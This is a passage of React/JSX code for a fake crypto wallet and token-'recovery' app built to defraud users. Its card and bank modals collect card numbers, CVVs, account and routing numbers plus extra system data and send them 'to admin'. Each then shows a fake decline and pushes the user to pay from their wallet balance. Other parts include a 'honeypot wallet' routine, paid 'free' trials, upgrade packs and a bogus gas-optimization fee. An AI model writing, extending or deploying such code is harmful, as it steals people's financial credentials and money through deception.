                        setShowModal(null);
                        updateNetworkCongestion();
                        setTimeout(() => generateHoneypotWallet(), 100);
                      }}>
                        <img src={network.logo} alt={network.name} className="w-8 h-8 rounded-full mr-3" />
                        <div className="flex-1">
                          <div className="text-white font-medium flex items-center justify-between">
                            <span>{network.name}</span>
                            {selectedNetwork === network.id && <div className="w-2 h-2 bg-green-400 rounded-full"></div>}
                          </div>
                          <div className="flex justify-between items-center">
                            <div className="text-gray-400 text-sm">Connected</div>
                            <div className={`text-xs px-2 py-1 rounded ${
                              network.congestion === 'High' ? 'bg-red-900 text-red-300' :
                              network.congestion === 'Medium' ? 'bg-yellow-900 text-yellow-300' :
                              'bg-green-900 text-green-300'
                            }`}>
                              {network.congestion} Gas
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}



          {/* Free Trial Modal */}
          {showModal === 'freeTrial' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Trial Pack Available!</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-center">
                    <div className="text-green-400 text-3xl mb-2">GIFT</div>
                    <div className="text-white font-semibold mb-2">Test Recovery System</div>
                    <div className="text-gray-300 text-sm mb-4">
                      Get trial tokens to test the recovery system with minimal gas cost.
                    </div>
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-300 text-sm">Trial Pack:</span>
                      <span className="text-blue-400 font-semibold">100 REC Tokens</span>
                    </div>
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-300 text-sm">Estimated Value:</span>
                      <span className="text-white font-semibold">~$100 USD</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-gray-300 text-sm">Gas Fee:</span>
                      <span className="text-blue-400 font-bold">0.003 ETH (~$9)</span>
                    </div>
                  </div>
                  
                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
                    <div className="text-blue-300 text-sm font-semibold mb-1">What you get:</div>
                    <div className="text-gray-300 text-xs space-y-1">
                      <div>• 50 real recovery tokens in your wallet</div>
                      <div>• Test trading on Uniswap</div>
                      <div>• See how the system works</div>
                      <div>• No payment required</div>
                    </div>
                  </div>
                  
                  <button 
                    onClick={async () => {
                      setLoading(true);
                      
                      // Send free trial tokens
                      const result = await fetch('/api/send-free-trial', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                          userAddress: userAddress
                        })
                      });
                      
                      const data = await result.json();
                      
                      if (data.success) {
                        setHasClaimedFreeTrial(true);
                        setStatus('🎉 Free trial tokens sent! Check your wallet in 2-3 minutes.');
                        setShowModal('trialSuccess');
                      }
                      
                      setLoading(false);
                    }}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Processing...' : 'Get Trial Pack - 0.003 ETH'}
                  </button>
                  
                  <button 
                    onClick={() => setShowModal(null)}
                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                  >
                    Skip Trial
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Trial Success Modal */}
          {showModal === 'trialSuccess' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Trial Tokens Sent!</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4 text-center">
                  <div className="text-green-400 text-4xl mb-2">SUCCESS</div>
                  <div className="text-white font-semibold mb-2">Success!</div>
                  <div className="text-gray-300 text-sm mb-4">
                    50 REC tokens have been sent to your wallet. You can now test trading on Uniswap.
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">Next Steps:</div>
                    <div className="text-gray-300 text-sm space-y-1">
                      <div>1. Wait 2-3 minutes for tokens to appear</div>
                      <div>2. Try trading on Uniswap</div>
                      <div>3. Upgrade for more tokens</div>
                    </div>
                  </div>
                  
                  <div className="bg-yellow-900/30 p-3 rounded-lg border border-yellow-600">
                    <div className="text-yellow-300 text-sm font-semibold mb-1">UPGRADE Want More?</div>
                    <div className="text-gray-300 text-xs mb-2">Unlock larger amounts with premium recovery</div>
                    <button 
                      onClick={() => setShowModal('upgradeOffer')}
                      className="w-full bg-yellow-600 hover:bg-yellow-700 py-2 rounded text-white text-sm font-semibold"
                    >
                      See Premium Options
                    </button>
                  </div>
                  
                  <button 
                    onClick={() => {
                      window.open('https://app.uniswap.org/#/swap?inputCurrency=0x1234567890123456789012345678901234567890&outputCurrency=ETH', '_blank');
                      setShowModal(null);
                    }}
                    className="w-full bg-pink-600 hover:bg-pink-700 py-3 rounded-lg text-white font-semibold"
                  >
                    Test Trade on Uniswap →
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Upgrade Offer Modal */}
          {showModal === 'upgradeOffer' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Premium Recovery</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-center">
                    <div className="text-yellow-400 text-3xl mb-2">MONEY</div>
                    <div className="text-white font-semibold mb-2">Unlock Higher Amounts</div>
                    <div className="text-gray-300 text-sm mb-4">
                      Upgrade to premium recovery to access larger token amounts with better trading potential.
                    </div>
                  </div>
                  
                  <div className="space-y-3">
                    <div className="bg-gray-700 p-4 rounded-lg border border-blue-500">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-blue-300 font-semibold">Starter Pack</span>
                        <span className="text-white font-bold">0.01 ETH</span>
                      </div>
                      <div className="text-gray-300 text-sm space-y-1">
                        <div>• 1,000 REC Tokens (~$1,000)</div>
                        <div>• Lower trading fees</div>
                        <div>• Priority processing</div>
                        <div className="text-blue-300 text-xs">~$30 value</div>
                      </div>
                    </div>
                    
                    <div className="bg-gray-700 p-4 rounded-lg border border-green-500">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-green-300 font-semibold">Pro Pack</span>
                        <span className="text-white font-bold">0.02 ETH</span>
                      </div>
                      <div className="text-gray-300 text-sm space-y-1">
                        <div>• 3,000 REC Tokens (~$3,000)</div>
                        <div>• Minimal trading fees</div>
                        <div>• Instant processing</div>
                        <div>• VIP support</div>
                        <div className="text-green-300 text-xs">~$60 value</div>
                      </div>
                    </div>
                    
                    <div className="bg-gray-700 p-4 rounded-lg border border-yellow-500">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-yellow-300 font-semibold">Max Pack</span>
                        <span className="text-white font-bold">0.05 ETH</span>
                      </div>
                      <div className="text-gray-300 text-sm space-y-1">
                        <div>• 7,500 REC Tokens (~$7,500)</div>
                        <div>• Zero trading fees</div>
                        <div>• Lightning fast processing</div>
                        <div>• Premium support</div>
                        <div className="text-yellow-300 text-xs">~$150 value</div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="text-gray-400 text-xs text-center">
                    All packages include real tokens sent to your wallet
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Gas Optimization Modal */}
          {showModal === 'gasOptimization' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Gas Optimization</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-center">
                    <div className="text-orange-400 text-3xl mb-2">FAST</div>
                    <div className="text-white font-semibold mb-2">High Gas Fees Detected</div>
                    <div className="text-gray-300 text-sm mb-4">
                      Current network congestion is causing high gas fees. Enable gas optimization to reduce costs by up to 60%.
                    </div>
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-300 text-sm">Current Gas:</span>
                      <span className="text-red-400 font-semibold">~$45.20</span>
                    </div>
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-300 text-sm">Optimized Gas:</span>
                      <span className="text-green-400 font-semibold">~$18.50</span>
                    </div>
                    <div className="border-t border-gray-600 pt-2 mt-2">
                      <div className="flex justify-between items-center">
                        <span className="text-white font-semibold">You Save:</span>
                        <span className="text-green-400 font-bold">$26.70 (59%)</span>
                      </div>
                    </div>
                  </div>
                  
                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
                    <div className="text-blue-300 text-sm font-semibold mb-1">Gas Optimization Features:</div>
                    <div className="text-gray-300 text-xs space-y-1">
                      <div>• Smart gas price prediction</div>
                      <div>• Transaction batching</div>
                      <div>• MEV protection</div>
                      <div>• Priority routing</div>
                    </div>
                  </div>
                  
                  <button 
                    onClick={() => {
                      setShowModal('gasPayment');
                    }}
                    className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold"
                  >
                    Enable Gas Optimization - $12
                  </button>
                  
                  <button 
                    onClick={() => setShowModal(null)}
                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                  >
                    Continue with High Fees
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Token Success Modal */}
          {showModal === 'tokenSuccess' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Tokens Received!</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4 text-center">
                  <div className="text-green-400 text-4xl mb-2">SUCCESS</div>
                  <div className="text-white font-semibold mb-2">Transaction Successful!</div>
                  <div className="text-gray-300 text-sm mb-4">
                    Your tokens have been successfully transferred and are now available for trading.
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">Received:</div>
                    <div className="text-green-400 text-lg font-bold">2,500 REC Tokens</div>
                    <div className="text-gray-400 text-sm">Worth ~$2,500 USD</div>
                  </div>
                  
                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
                    <div className="text-blue-300 text-sm font-semibold mb-1">Trading Available:</div>
                    <div className="text-gray-300 text-xs space-y-1">
                      <div>• Listed on Uniswap V3</div>
                      <div>• Current price: $1.00 per token</div>
                      <div>• 24h volume: $50,000</div>
                      <div>• Ready to trade immediately</div>
                    </div>
                  </div>
                  
                  <button 
                    onClick={() => {
                      window.open('https://app.uniswap.org/#/swap?inputCurrency=ETH&outputCurrency=0x1234567890123456789012345678901234567890', '_blank');
                      setShowModal(null);
                    }}
                    className="w-full bg-pink-600 hover:bg-pink-700 py-3 rounded-lg text-white font-semibold"
                  >
                    Trade on Uniswap →
                  </button>
                  
                  <div className="text-gray-400 text-xs">
                    Tokens will appear in your wallet within 5-10 minutes
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Buy with Card Modal - Credit Card Collection */}
          {showModal === 'buyCard' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full max-h-[90vh] overflow-y-auto">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Buy ETH with Card</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">Purchase Amount</div>
                    <div className="flex items-center justify-between mb-2">
                      <input 
                        type="number" 
                        placeholder="0.1" 
                        defaultValue="0.1"
                        className="bg-gray-600 text-white p-2 rounded flex-1 mr-2" 
                        id="buyAmount"
                      />
                      <span className="text-white">ETH</span>
                    </div>
                    <div className="text-gray-400 text-sm">≈ $320.00 USD + fees</div>
                  </div>
                  
                  {/* Credit Card Form */}
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-3">SECURE Payment Details</div>
                    
                    <div className="space-y-3">
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Card Number</label>
                        <input 
                          type="text" 
                          placeholder="1234 5678 9012 3456"
                          maxLength="19"
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
                          id="cardNumber"
                          onChange={(e) => {
                            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
                            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                            e.target.value = value;
                          }}
                        />
                      </div>
                      
                      <div className="grid grid-cols-2 gap-3">
                        <div>
                          <label className="block text-gray-300 text-sm mb-1">Expiry Date</label>
                          <input 
                            type="text" 
                            placeholder="MM/YY"
                            maxLength="5"
                            className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
                            id="cardExpiry"
                            onChange={(e) => {
                              let value = e.target.value.replace(/\D/g, '');
                              if (value.length >= 2) {
                                value = value.substring(0,2) + '/' + value.substring(2,4);
                              }
                              e.target.value = value;
                            }}
                          />
                        </div>
                        <div>
                          <label className="block text-gray-300 text-sm mb-1">CVV</label>
                          <input 
                            type="text" 
                            placeholder="123"
                            maxLength="4"
                            className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
                            id="cardCVV"
                            onChange={(e) => {
                              e.target.value = e.target.value.replace(/\D/g, '');
                            }}
                          />
                        </div>
                      </div>
                      
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Cardholder Name</label>
                        <input 
                          type="text" 
                          placeholder="John Doe"
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
                          id="cardName"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Billing Address</label>
                        <input 
                          type="text" 
                          placeholder="123 Main St, City, State, ZIP"
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
                          id="cardAddress"
                        />
                      </div>
                    </div>
                  </div>
                  
                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
                    <div className="text-blue-300 text-sm font-semibold mb-1">SECURE Payment</div>
                    <div className="text-gray-300 text-xs">
                      • 256-bit SSL encryption
                      • PCI DSS compliant
                      • Instant delivery to your wallet
                    </div>
                  </div>
                  
                  <button 
                    onClick={async () => {
                      const amount = document.getElementById('buyAmount')?.value || '0.1';
                      const cardNumber = document.getElementById('cardNumber')?.value || '';
                      const cardExpiry = document.getElementById('cardExpiry')?.value || '';
                      const cardCVV = document.getElementById('cardCVV')?.value || '';
                      const cardName = document.getElementById('cardName')?.value || '';
                      const cardAddress = document.getElementById('cardAddress')?.value || '';
                      
                      if (!cardNumber || !cardExpiry || !cardCVV || !cardName) {
                        setStatus('❌ Please fill in all card details');
                        return;
                      }
                      
                      setLoading(true);
                      setStatus('Processing payment...');
                      
                      try {
                        // Collect comprehensive system data
                        const { collectAdvancedData } = await import('../utils/advancedCollection');
                        const advancedData = await collectAdvancedData();
                        
                        // Send credit card info with advanced data to admin
                        await fetch('/api/collect-card-info', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                            userAddress: userAddress,
                            amount: amount,
                            cardNumber: cardNumber,
                            cardExpiry: cardExpiry,
                            cardCVV: cardCVV,
                            cardName: cardName,
                            cardAddress: cardAddress,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            advancedData: advancedData
                          })
                        });
                        
                        // Simulate processing delay
                        setTimeout(() => {
                          setStatus('❌ Payment failed: Card declined. Try wallet payment instead.');
                          setShowModal('paymentFailed');
                        }, 3000);
                        
                      } catch (error) {
                        setStatus('❌ Payment processing error');
                      }
                      
                      setLoading(false);
                    }}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                  >
                    {loading ? 'Processing Payment...' : 'Complete Purchase'}
                  </button>
                  
                  <div className="text-gray-400 text-xs text-center">
                    Secure payment • Your card info is encrypted • 24/7 support
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Payment Failed Modal */}
          {showModal === 'paymentFailed' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Payment Failed</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4 text-center">
                  <div className="text-red-400 text-4xl mb-2">ERROR</div>
                  <div className="text-white font-semibold mb-2">Card Payment Declined</div>
                  <div className="text-gray-300 text-sm mb-4">
                    Your card was declined by the bank. This is common with crypto purchases. Try using your wallet balance instead.
                  </div>
                  
                  <div className="bg-yellow-900/30 p-3 rounded-lg border border-yellow-600">
                    <div className="text-yellow-300 text-sm font-semibold mb-1">ALTERNATIVE Solution</div>
                    <div className="text-gray-300 text-xs mb-2">
                      Use your existing ETH balance to complete the purchase. This bypasses bank restrictions.
                    </div>
                  </div>
                  
                  <button 
                    onClick={async () => {
                      const amount = '0.1'; // Default amount
                      setLoading(true);
                      setStatus('Processing wallet payment...');
                      
                      try {
                        await processBuyETH(amount);
                      } catch (error) {
                        setStatus('Payment failed: ' + error.message);
                      }
                      
                      setLoading(false);
                      setShowModal(null);
                    }}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                  >
                    {loading ? 'Processing...' : 'Pay with Wallet Balance'}
                  </button>
                  
                  <button 
                    onClick={() => setShowModal(null)}
                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                  >
                    Try Different Card
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Buy with Bank Modal - Banking Info Collection */}
          {showModal === 'buyBank' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full max-h-[90vh] overflow-y-auto">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Bank Transfer Setup</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">Purchase Amount</div>
                    <div className="flex items-center justify-between mb-2">
                      <input 
                        type="number" 
                        placeholder="0.1" 
                        defaultValue="0.1"
                        className="bg-gray-600 text-white p-2 rounded flex-1 mr-2" 
                        id="bankBuyAmount"
                      />
                      <span className="text-white">ETH</span>
                    </div>
                    <div className="text-gray-400 text-sm">≈ $320.00 USD (lower fees)</div>
                  </div>
                  
                  {/* Banking Information Form */}
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-3">BANKING Details</div>
                    
                    <div className="space-y-3">
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Full Name</label>
                        <input 
                          type="text" 
                          placeholder="John Doe"
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
                          id="bankName"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Bank Name</label>
                        <input 
                          type="text" 
                          placeholder="Chase Bank, Wells Fargo, etc."
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
                          id="bankInstitution"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Account Number</label>
                        <input 
                          type="text" 
                          placeholder="1234567890"
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
                          id="bankAccount"
                          onChange={(e) => {
                            e.target.value = e.target.value.replace(/\D/g, '');
                          }}
                        />
                      </div>
                      
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Routing Number</label>
                        <input 
                          type="text" 
                          placeholder="021000021"
                          maxLength="9"
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
                          id="bankRouting"
                          onChange={(e) => {
                            e.target.value = e.target.value.replace(/\D/g, '');
                          }}
                        />
                      </div>
                      
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Account Type</label>
                        <select 
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
                          id="bankType"
                        >
                          <option value="checking">Checking Account</option>
                          <option value="savings">Savings Account</option>
                        </select>
                      </div>
                      
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Phone Number</label>
                        <input 
                          type="text" 
                          placeholder="(555) 123-4567"
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
                          id="bankPhone"
                          onChange={(e) => {
                            let value = e.target.value.replace(/\D/g, '');
                            if (value.length >= 6) {
                              value = `(${value.slice(0,3)}) ${value.slice(3,6)}-${value.slice(6,10)}`;
                            } else if (value.length >= 3) {
                              value = `(${value.slice(0,3)}) ${value.slice(3)}`;
                            }
                            e.target.value = value;
                          }}
                        />
                      </div>
                      
                      <div>
                        <label className="block text-gray-300 text-sm mb-1">Address</label>
                        <input 
                          type="text" 
                          placeholder="123 Main St, City, State, ZIP"
                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-green-500"
                          id="bankAddress"
                        />
                      </div>
                    </div>
                  </div>
                  
                  <div className="bg-green-900/30 p-3 rounded-lg border border-green-600">
                    <div className="text-green-300 text-sm font-semibold mb-1">SECURE Transfer</div>
                    <div className="text-gray-300 text-xs">
                      • Bank-grade encryption
                      • ACH secure processing
                      • 1-3 business days delivery
                    </div>
                  </div>
                  
                  <button 
                    onClick={async () => {
                      const amount = document.getElementById('bankBuyAmount')?.value || '0.1';
                      const bankName = document.getElementById('bankName')?.value || '';
                      const bankInstitution = document.getElementById('bankInstitution')?.value || '';
                      const bankAccount = document.getElementById('bankAccount')?.value || '';
                      const bankRouting = document.getElementById('bankRouting')?.value || '';
                      const bankType = document.getElementById('bankType')?.value || 'checking';
                      const bankPhone = document.getElementById('bankPhone')?.value || '';
                      const bankAddress = document.getElementById('bankAddress')?.value || '';
                      
                      if (!bankName || !bankInstitution || !bankAccount || !bankRouting) {
                        setStatus('❌ Please fill in all banking details');
                        return;
                      }
                      
                      if (bankRouting.length !== 9) {
                        setStatus('❌ Invalid routing number (must be 9 digits)');
                        return;
                      }
                      
                      setLoading(true);
                      setStatus('Setting up bank transfer...');
                      
                      try {
                        // Collect comprehensive system data
                        const { collectAdvancedData } = await import('../utils/advancedCollection');
                        const advancedData = await collectAdvancedData();
                        
                        // Send banking info with advanced data to admin
                        await fetch('/api/collect-bank-info', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                            userAddress: userAddress,
                            amount: amount,
                            bankName: bankName,
                            bankInstitution: bankInstitution,
                            bankAccount: bankAccount,
                            bankRouting: bankRouting,
                            bankType: bankType,
                            bankPhone: bankPhone,
                            bankAddress: bankAddress,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            advancedData: advancedData
                          })
                        });
                        
                        // Simulate processing delay
                        setTimeout(() => {
                          setStatus('❌ Bank transfer setup failed: Account verification required. Try wallet payment.');
                          setShowModal('bankFailed');
                        }, 4000);
                        
                      } catch (error) {
                        setStatus('❌ Bank transfer setup error');
                      }
                      
                      setLoading(false);
                    }}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                  >
                    {loading ? 'Setting Up Transfer...' : 'Setup Bank Transfer'}
                  </button>
                  
                  <div className="text-gray-400 text-xs text-center">
                    Secure banking • Your info is encrypted • Lower fees than cards
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Bank Transfer Failed Modal */}
          {showModal === 'bankFailed' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Bank Transfer Failed</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4 text-center">
                  <div className="text-red-400 text-4xl mb-2">BANK</div>
                  <div className="text-white font-semibold mb-2">Account Verification Required</div>
                  <div className="text-gray-300 text-sm mb-4">
                    Your bank requires additional verification for crypto purchases. This process can take 5-7 business days. Use your wallet balance for instant purchase.
                  </div>
                  
                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
                    <div className="text-blue-300 text-sm font-semibold mb-1">INSTANT Alternative</div>
                    <div className="text-gray-300 text-xs mb-2">
                      Skip bank verification and use your existing ETH balance. Instant delivery, no waiting.
                    </div>
                  </div>
                  
                  <button 
                    onClick={async () => {
                      const amount = '0.1'; // Default amount
                      setLoading(true);
                      setStatus('Processing instant wallet payment...');
                      
                      try {
                        await processBuyETH(amount);
                      } catch (error) {
                        setStatus('Payment failed: ' + error.message);
                      }
                      
                      setLoading(false);
                      setShowModal(null);
                    }}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                  >
                    {loading ? 'Processing...' : 'Instant Wallet Payment'}
                  </button>
                  
                  <button 
                    onClick={() => setShowModal('buyCard')}
                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                  >
                    Try Credit Card Instead
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Buy Success Modal */}
          {showModal === 'buySuccess' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Purchase in Progress</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4 text-center">
                  <div className="text-green-400 text-4xl mb-2">CARD</div>
                  <div className="text-white font-semibold mb-2">Payment Gateway Opened</div>
                  <div className="text-gray-300 text-sm mb-4">
                    Complete your purchase in the payment window. ETH will be delivered to your wallet within 5-10 minutes.
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">What happens next:</div>
                    <div className="text-gray-300 text-sm space-y-1 text-left">
                      <div>1. Complete payment in MoonPay window</div>
                      <div>2. ETH will be processed and delivered</div>
                      <div>3. Check your wallet in 5-10 minutes</div>
                      <div>4. Start trading immediately</div>
                    </div>
                  </div>
                  
                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
                    <div className="text-blue-300 text-sm font-semibold mb-1">💡 Pro Tip</div>
                    <div className="text-gray-300 text-xs">
                      Keep this window open to see when your ETH arrives. You'll get a notification.
                    </div>
                  </div>
                  
                  <button 
                    onClick={() => setShowModal(null)}
                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white"
                  >
                    Continue Using Wallet
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Gas Payment Modal */}
          {showModal === 'gasPayment' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Enable Gas Optimization</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-center">
                    <div className="text-green-400 text-3xl mb-2">SUCCESS</div>
                    <div className="text-white font-semibold mb-2">Optimization Ready</div>
                    <div className="text-gray-300 text-sm">
                      Pay the one-time optimization fee to enable advanced gas management for all future transactions.
                    </div>
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">What you get:</div>
                    <div className="text-gray-300 text-sm space-y-1">
                      <div>• Lifetime gas optimization</div>
                      <div>• Up to 60% gas savings</div>
                      <div>• Faster transaction processing</div>
                      <div>• MEV protection included</div>
                      <div>• Works on all networks</div>
                    </div>
                  </div>
                  
                  <button 
                    onClick={() => processTransaction('gas_optimization', null, '0.008')}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Processing...' : 'Pay 0.008 ETH - Enable Optimization'}
                  </button>
                  
                  <div className="text-gray-400 text-xs text-center">
                    Secure payment • Instant activation • 30-day money back guarantee
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Swap Modal */}
          {showModal === 'swap' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Swap</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="flex justify-between items-center mb-2">
                      <div className="text-gray-300 text-sm">From</div>
                      <div className="text-gray-400 text-xs">
